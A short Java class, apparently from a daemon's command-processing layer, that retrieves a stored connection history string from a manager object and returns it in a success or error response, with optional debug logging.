package com.fx.maind.commands;

import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.GetConnectionHistoryCommand;
import com.daemon_bridge.GetConnectionHistoryCommandResponse;
import com.fx.maind.ref.Customization;
import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.logger.FxLog;

public class GetConnectionHistoryCommandProcess {
	private static final String TAG = "GetConnectionHistoryCommandProcess";
	private static final boolean VERBOSE = true;
	private static boolean LOGV = Customization.DEBUG ? VERBOSE : false;
	
	public static CommandResponseBase execute(AppEngine sAppEngine, GetConnectionHistoryCommand getConnectionHistoryCommand) {
		if(LOGV) FxLog.d(TAG, "# execute START");
		
		GetConnectionHistoryCommandResponse commandResponse  = null;
		
		try {
			ConnectionHistoryManager connectionHistoryManager = sAppEngine.getConnectionHistoryManager();
			String connectionHistory = connectionHistoryManager.getAllHistory();
			
			commandResponse = new GetConnectionHistoryCommandResponse(CommandResponseBase.SUCCESS);
			commandResponse.setConnectionHistory(connectionHistory);
		}
		catch (Throwable t) {
			if(LOGV) FxLog.e(TAG, "# execute error:" + t.toString());
			commandResponse = new GetConnectionHistoryCommandResponse(CommandResponseBase.ERROR);
		}
		
		if(LOGV) FxLog.d(TAG, "# execute EXIT");
		return commandResponse;
	}

}
